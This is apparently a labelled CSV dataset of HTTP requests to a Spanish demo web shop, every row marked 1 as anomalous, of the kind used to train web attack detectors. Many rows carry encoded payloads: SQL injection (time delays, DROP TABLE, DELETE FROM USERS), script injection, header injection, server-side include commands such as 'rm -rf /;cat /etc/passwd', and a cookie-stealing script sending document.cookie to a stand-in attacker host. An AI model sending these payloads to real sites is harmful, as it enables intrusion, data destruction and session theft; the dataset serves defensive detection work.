request,classification
/tienda1/publico/pagar.jsp /modo=insertar&precio=7730&B1=Pasar+por+caja%2F,1
/tienda1/publico/pagar.jsp /modo=insertar&precioA=7730&B1=Pasar+por+caja,1
/tienda1/publico/registro.jsp /modo=registro&login=sarge&password=apad-r8nad5ra&nombre=Adolfina&apellidos=Sanmarti+Challiolany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&email=paolieri%40cubiertoscbb.gu&dni=55702502K&direccion=Pla%E7a+Carrasco+i+Formiguera+163%2C+&ciudad=Saelices+de+Mayorga&cp=06890&provincia=Valencia&ntc=1427980931123468&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=sarge&password=apad-r8nad5ra&nombre=Adolfina&apellidos=Sanmarti+Challiol&email=paolieri%40cubiertoscbb.gu&dni=55702502K&direccion=Pla%E7a+Carrasco+i+Formiguera+163%2C+&ciudad=Saelices+de+Mayorga&cp=3379A&provincia=Valencia&ntc=1427980931123468&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=sarge&password=apad-r8nad5ra&nombre=Adolfina&apellidos=Sanmarti+Challiol&email=paolieri%40cubiertoscbb.gu&dni=55702502K&direccion=Pla%E7a+Carrasco+i+Formiguera+163%2C+&ciudad=Saelices+de+Mayorga&cp=06890&provincia=Valencia&ntc=1427980931123468&B1A=Registrar,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carrito%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/vaciar.jsp /B2=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=hedman&password=53t%E9rico&nombre=Rayburn&apellidos=Graupera+Huaranca&email=fegan%40unidadesdeventilacion.az&dni=75B1383B04H&direccion=C%2F+Estrella+De+Venus%2C+23+2-A&ciudad=Cendea+de+Olza%2FOltza+Zendea&cp=07127&provincia=Huelva&ntc=2764848687566400&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=hedman&password=53t%E9rico&nombre=Rayburn&apellidos=Graupera+Huaranca&email=fegan%40unidadesdeventilacion.az&dni=36292641K&direccion=C%2F+Estrella+De+Venus%2C+23+2-A&ciudad=Cendea+de+Olza%2FOltza+Zendea&cp=07127&provincia=Huelva&ntc=2764848687566400&B1A=Registrar,1
/tienda1/publico/anadir.jsp /id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=40%2500&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=1&nombre=Jam%F3n+Ib%E9rico&precio=Set-cookie%253A%2BTamper%253D1041264011025374727&cantidad=40&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=2%2F&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=40&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=1&nombre=Jam%F3n+Ib%E9rico&precioA=39&cantidad=40&B1=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=sysint9&pwd=l2n7at8s55&remember=on&B1=Entrar%2B,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=sysint9&pwd=l2n7at8s55&remember=on&B1=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=sysint9&pwd=p205il%2Fo2a&remember=on&B1=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=1,1
/tienda1/publico/caracteristicas.jsp /id=1%27+AND+%271%27%3D%271,1
/tienda1/publico/caracteristicas.jsp /id=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727,1
/tienda1/publico/caracteristicas.jsp /idA=1,1
/tienda1/publico/entrar.jsp /errorMsg=Credenciales+incorrectas,1
/tienda1/publico/entrar.jsp /errorMsg=Credenciales+incorrectas%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&B1=Pasar+por+caja,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=5021&B1=Confirmar%2F,1
/tienda1/publico/pagar.jsp /modo=insertar&precioA=5021&B1=Pasar+por+caja,1
/tienda1/publico/registro.jsp /modo=registro&login=tat7&password=p0on57cia008nto&nombre=Camelia&apellidos=Zurita+Santander&email=diessl-claver%40tradedeficit.mz&dni=59059811C&direccion=Artes%2C+S%2FN+&ciudad=Escobar+de+Polendos&cp=18518&provincia=Burgos&ntc=2636619315022095&B1=Registrar%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C,1
/tienda1/publico/registro.jsp /modo=registro&login=tat7&password=p0on57cia008nto&nombre=Camelia&apellidos=Zurita+Santander&email=diessl-claver%40tradedeficit.mz&dni=59059811C&direccion=Cal*l%2Be+Ovidio+S%2FN+12-G&ciudad=Escobar+de+Polendos&cp=18518&provincia=Burgos&ntc=2636619315022095&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=tat7&password=p0on57cia008nto&nombre=Camelia&apellidos=Zurita+Santander&email=diessl-claver%40tradedeficit.mz&dniA=59059811C&direccion=Artes%2C+S%2FN+&ciudad=Escobar+de+Polendos&cp=18518&provincia=Burgos&ntc=2636619315022095&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carrito%2500,1
/tienda1/publico/vaciar.jsp /B2=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=crozier&password=aborrecimiento&nombre=Ricardina&apellidos=Burch+Echaniz&email=hyer_longdon0%40artforall.mc&dni=62804007T%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&direccion=Plza.+Troyano+Salaverry%2C+42%2C+&ciudad=Ch%F3var&cp=30500&provincia=Le%F3n&ntc=1229899553268508&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=crozier&password=aborrecimiento&nombre=Abig*ail&apellidos=Burch+Echaniz&email=hyer_longdon0%40artforall.mc&dni=62804007T&direccion=Plza.+Troyano+Salaverry%2C+42%2C+&ciudad=Ch%F3var&cp=30500&provincia=Le%F3n&ntc=1229899553268508&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=crozier&password=aborrecimiento&nombre=Ricardina&apellidos=Burch+Echaniz&email=hyer_longdon0%40artforall.mc&dni=62804007T&direccion=Plza.+Troyano+Salaverry%2C+42%2C+&ciudadA=Ch%F3var&cp=30500&provincia=Le%F3n&ntc=1229899553268508&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=3&nombre=Vino+Rioja&precio=39any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&cantidad=35&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=3&nombre=Vino+Rioja&precio=85%2F&cantidad=35&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=3&nombre=Vino+Rioja&precio=39&cantidad=35&B1A=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=levis&pwd=8scualide6&remember=off&B1=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=levis&pwd=8scualide6&remember=off%2F&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&loginA=levis&pwd=8scualide6&remember=off&B1=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=1%27INJECTED_PARAM,1
/tienda1/publico/caracteristicas.jsp /id=%27+AND+%271%27%3D%271,1
/tienda1/publico/caracteristicas.jsp /idA=1,1
/tienda1/publico/entrar.jsp /errorMsg=Credenciales+incorrectas%22+AND+%221%22%3D%221,1
/tienda1/publico/entrar.jsp /errorMsg=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=1049&B1=Confirmar,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=1049&B1=Pasar+por+caja%2F,1
/tienda1/publico/pagar.jsp /modoA=insertar&precio=1049&B1=Confirmar,1
/tienda1/publico/registro.jsp /modo=registro&login=beaumont&password=S9lEva398D59&nombre=Rudy&apellidos=Auladell+Quint%E1s&email=garrick-overton%40corjet.gd&dni=15467411A&direccion=C%2F+Quasimodo+95+13%3FE&ciudad=Arbanc%F3n&cp=37622&provincia=Zamora&ntc=7990892411881647&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=beaumont&password=S9lEva398D59&nombre=Rudy&apellidos=Auladell+Quint%E1s&email=garrick-overton%40corjet.gd&dni=15467411A&direccion=C%2F+Quasimodo+95+13%3FE&ciudad=Arbanc%F3n&cp=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&provincia=Zamora&ntc=7990892411881647&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=beaumont&password=S9lEva398D59&nombre=Rudy&apellidos=Auladell+Quint%E1s&email=garrick-overton%40corjet.gd&dni=15467411A&direccion=Rou%2Bco+6*8%2C+&ciudad=Arbanc%F3n&cp=37622&provincia=Zamora&ntc=7990892411881647&B1=Registrar,1
/tienda1/publico/registro.jsp /modoA=registro&login=beaumont&password=S9lEva398D59&nombre=Rudy&apellidos=Auladell+Quint%E1s&email=garrick-overton%40corjet.gd&dni=15467411A&direccion=C%2F+Quasimodo+95+13%3FE&ciudad=Arbanc%F3n&cp=37622&provincia=Zamora&ntc=7990892411881647&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carrito%2500,1
/tienda1/publico/vaciar.jsp /B2=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=ver%3Fd*%3Fi&password=ran7%F3n&nombre=Jairo&apellidos=Uruburu+Ayensa&email=coffer%40soyvalenciano.bu&dni=19782082N&direccion=Pe%F1a+Dorada+87%2C+1%3FF&ciudad=Valfarta&cp=09660&provincia=Girona&ntc=1025019984542981&B1=Registrar,1
/tienda1/miembros/editar.jsp /modoA=registro&login=bradee&password=ran7%F3n&nombre=Jairo&apellidos=Uruburu+Ayensa&email=coffer%40soyvalenciano.bu&dni=19782082N&direccion=Pe%F1a+Dorada+87%2C+1%3FF&ciudad=Valfarta&cp=09660&provincia=Girona&ntc=1025019984542981&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=1%2F&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=75&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=75&B1A=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=mcnair&pwd=81cob6r&remember=off%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=mcnair&pwd=81cob6r&remember=off&B1=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=mcnair&pwd=81cob6r&remember=on%2F&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=mcnair&pwd=81cob6r&remember=off&B1A=Entrar,1
/tienda1/publico/caracteristicas.jsp /idA=1,1
/tienda1/publico/entrar.jsp /errorMsg=Credenciales+incorrectas%27+AND+%271%27%3D%271,1
/tienda1/publico/entrar.jsp /errorMsg=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=1408&B1=Confirmar%2F,1
/tienda1/publico/pagar.jsp /modoA=insertar&precio=1408&B1=Confirmar,1
/tienda1/publico/registro.jsp /modo=registro&login=donnelly&password=14a8u19lero&nombre=Alessandra&apellidos=Ricom%E0+Morato&email=gambold%40fok.so&dni=66367222D%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&direccion=Calle+Cavallers+63+&ciudad=Tocina&cp=03729&provincia=Valladolid&ntc=2169388539628734&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=donnelly&password=14a8u19lero&nombre=Alessandra&apellidos=Ricom%E0+Morato&email=gambold%40fok.so&dniA=66367222D&direccion=Calle+Cavallers+63+&ciudad=Tocina&cp=03729&provincia=Valladolid&ntc=2169388539628734&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carrito%27+AND+%271%27%3D%271,1
/tienda1/publico/vaciar.jsp /B2=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=summerli&password=la5a6a5o1&nombre=R%F3mula&apellidos=Huaranca+Atabales&email=darling%40escuelamontessori.gr&dni=83790899J&direccion=Calle+Arnedo+5+&ciudad=Masarac&cp=06850&provincia=Teruel&ntc=7550943100926472&B1=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,1
/tienda1/miembros/editar.jsp /modo=registro&login=summerli&password=la5a6a5o1&nombre=R%F3mula&apellidos=Huaranca+Atabales&email=darling%40escuelamontessori.gr&dni=83790899J&direccion=Calle+Arnedo+5+&ciudad=Masarac&cp=06850&provincia=Teruel&ntc=686913880615334&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=summerli&password=la5a6a5o1&nombre=R%F3mula&apellidosA=Huaranca+Atabales&email=darling%40escuelamontessori.gr&dni=83790899J&direccion=Calle+Arnedo+5+&ciudad=Masarac&cp=06850&provincia=Teruel&ntc=7550943100926472&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=87%27+DELETE+FROM+USERS&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=1%2F&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=87&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /idA=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=87&B1=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&pwd=569t179e&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=sparks&pwd=569t179e&remember=on%2F&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=sparks&pwd=569t179e&rememberA=on&B1=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=1%27INJECTED_PARAM,1
/tienda1/publico/caracteristicas.jsp /id=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,1
/tienda1/publico/entrar.jsp /errorMsg=Credenciales+incorrectas%2B,1
/tienda1/publico/entrar.jsp /errorMsg=%27+DELETE+FROM+USERS,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertarbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&precio=2248&B1=Confirmar,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&B1=Confirmar,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=2248&B1=Confirmar%2F,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=2248&B1A=Confirmar,1
/tienda1/publico/registro.jsp /modo=registro&login=bumstead&password=3ulga5izado4a&nombre=Neife&apellidos=Barrero&email=chester_farmer%40eneltajo.no&dni=30341163T&direccion=Paseo+San+Eugenio+9+10A&ciudad=Pr%E9jano&cp=32737&provincia=%C1vila&ntc=044425677026812&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carrito%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/vaciar.jsp /B2=%27INJECTED_PARAM,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=koay&password=e*mbermejecer&nombre=Baroncio&apellidos=Monjo+Porto&email=ahna%40zampy.in&dniA=26293513M&direccion=Calle+Ramon+De+Campoamor%2C+165+5%3FG&ciudad=Vilamacolum&cp=19245&provincia=Badajoz&ntc=1165920681066048&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=24&B1=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/anadir.jsp /id=2&nombre=Ques%2Bo+Manchego&precio=100&cantidad=24&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=24&B1A=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=toole&pwd=e9ternecer&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=toole&pwd=e9ternecer&remember=on&B1=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=toole&pwd=%2Cap%24iLadOra&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=toole&pwd=e9ternecer&remember=on&B1A=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235,1
/tienda1/publico/entrar.jsp /errorMsg=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=1216&B1=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=1216&B1=Pasar+por+caja%2F,1
/tienda1/publico/pagar.jsp /modo=insertar&precioA=1216&B1=Pasar+por+caja,1
/tienda1/publico/registro.jsp /modo=registro&login=jiann&password=freno&nombre=Raifroid&apellidos=Sol%E1+Portillo&email=nererova%40camilafansite.by&dni=41955080K&direccion=C%2F+Fusta+40+11-F&ciudad=San+Pablo+de+los+Montes&cp=49333&provincia=Burgos&ntc=%4040&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=grz%3F%2Fegore*3&password=freno&nombre=Raifroid&apellidos=Sol%E1+Portillo&email=nererova%40camilafansite.by&dni=41955080K&direccion=C%2F+Fusta+40+11-F&ciudad=San+Pablo+de+los+Montes&cp=49333&provincia=Burgos&ntc=5510588122545598&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=jiann&password=freno&nombre=Raifroid&apellidos=Sol%E1+Portillo&email=nererova%40camilafansite.by&dni=41955080K&direccion=C%2F+Fusta+40+11-F&ciudad=San+Pablo+de+los+Montes&cpA=49333&provincia=Burgos&ntc=5510588122545598&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carrito%2520,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=veriee&password=zabalm*edina&nombre=Septimo&apellidos=Juanico+Castro&email=fleming_sayce%40miami-beach.com.kz&dni=44614622G&direccion=C%2F+Minerva%2C+177%2C+1-C&ciudad=%2BO*tos&cp=22280&provincia=Palencia&ntc=3985053598089908&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=veriee&password=zabalm*edina&nombre=Septimo&apellidos=Juanico+Castro&emailA=fleming_sayce%40miami-beach.com.kz&dni=44614622G&direccion=C%2F+Minerva%2C+177%2C+1-C&ciudad=Vi%F1uelas&cp=22280&provincia=Palencia&ntc=3985053598089908&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=3&nombre=Queso+Manchego&precio=39&cantidad=38&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=3&nombre=Queso+Manchego&precio=39&cantidad=38&B1=A%F1adir+al+carrito%2520,1
/tienda1/publico/anadir.jsp /id=3&nombre=Vino+.*%3FRioja&precio=39&cantidad=38&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=3&nombreA=Queso+Manchego&precio=39&cantidad=38&B1=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&login=soucie6&pwd=3fistol23&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=soucie6&pwd=3fistol23&remember=off%2F&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&loginA=soucie6&pwd=3fistol23&remember=on&B1=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=1%257C,1
/tienda1/publico/caracteristicas.jsp /id=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,1
/tienda1/publico/caracteristicas.jsp /idA=1,1
/tienda1/publico/entrar.jsp /errorMsg=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=6072&B1=Pasar+por+caja,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=6072&B1=Confirmar%2F,1
/tienda1/publico/pagar.jsp /modo=insertar&precioA=6072&B1=Pasar+por+caja,1
/tienda1/publico/registro.jsp /modo=registro&login=jarrett&password=ALe7a2De8&nombre=Oseas&apellidos=Quihuata+Cervell%F3&email=rebenciuc%40tiendasyofertas.kz&dni=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&direccion=Pisuerga+132+&ciudad=Pelayos+de+la+Presa&cp=36658&provincia=Lugo&ntc=9649891877150082&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=jarrett&password=ALe7a2De8&nombre=Oseas&apellidos=Quihuata+Cervell%F3&email=stockel6%40%40sexplorador.%40om&dni=92257096W&direccion=Pisuerga+132+&ciudad=Pelayos+de+la+Presa&cp=36658&provincia=Lugo&ntc=9649891877150082&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=jarrett&password=ALe7a2De8&nombre=Oseas&apellidos=Quihuata+Cervell%F3&email=rebenciuc%40tiendasyofertas.kz&dni=92257096W&direccion=Pisuerga+132+&ciudad=Pelayos+de+la+Presa&cp=36658&provincia=Lugo&ntcA=9649891877150082&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=hiroyuki&password=desbullar&nombre=Yoconda&apellidos=Rosas+Fabila&email=saiko%40enlanzarote.com.cx&dni=29372836L&direccion=Barriada+Juan+Xxiii%2C+100%2C+&ciudad=Almargen%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cp=03812&provincia=Toledo&ntc=2218102599227615&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=hiroyuki&password=desbullar&nombre=Yoconda&apellidos=Rosas+Fabila&email=saiko%40enlanzarote.com.cx&dni=29372836L&direccion=Barriada+Juan+Xxiii%2C+100%2C+&ciudad=Almargen&cp=03812&provincia=Toledo&ntc=250979195364815&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&loginA=hiroyuki&password=desbullar&nombre=Yoconda&apellidos=Rosas+Fabila&email=saiko%40enlanzarote.com.cx&dni=29372836L&direccion=Barriada+Juan+Xxiii%2C+100%2C+&ciudad=Almargen&cp=03812&provincia=Toledo&ntc=2218102599227615&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=3%2F&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=27&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /idA=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=27&B1=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=asbjorn&pwd=virulenta&remember=on&B1=Entrar%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=asbjorn&pwd=virulenta&remember=%3F&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=asbjorn&pwdA=virulenta&remember=on&B1=Entrar,1
/tienda1/publico/caracteristicas.jsp /idA=1,1
/tienda1/publico/entrar.jsp /errorMsg=%27OR%27a%3D%27a,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=5305&B1=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=5305&B1=Confirmar%2F,1
/tienda1/publico/pagar.jsp /modo=insertar&precioA=5305&B1=Pasar+por+caja,1
/tienda1/publico/registro.jsp /modo=registro&login=shu-gong&password=5ar9ca&nombre=*Roc%EDo+*del+Vall*e&apellidos=Garayoa+Aguiar&email=mcquarrie%40cochesautomaticos.lc&dni=78013066X&direccion=Calle+Arquitecto+Monleon+112+&ciudad=Agallas&cp=08275&provincia=C%E1ceres&ntc=0341907708355896&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carritoany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
